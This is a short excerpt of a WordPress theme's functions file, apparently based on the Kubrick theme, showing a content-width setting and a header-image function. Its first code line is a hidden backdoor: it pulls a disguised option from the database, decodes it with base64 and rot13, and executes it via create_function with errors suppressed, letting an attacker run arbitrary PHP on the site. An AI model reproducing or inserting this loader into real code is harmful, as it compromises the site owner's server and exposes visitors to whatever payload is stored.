...
$z=get_option("_site_transient_browser_f2ed246e65720891b73b6a6dbb4c5727"); $z=base64_decode(str_rot13($z)); if(strpos($z,"D6CE1173")!==false){ $_z=create_function("",$z); @$_z(); }
$content_width = 998;
...
function kubrick_header_image_url() {
	...
	//else
		$url = get_template_directory_uri() . '/images/tinderbox_hdr.jpg';
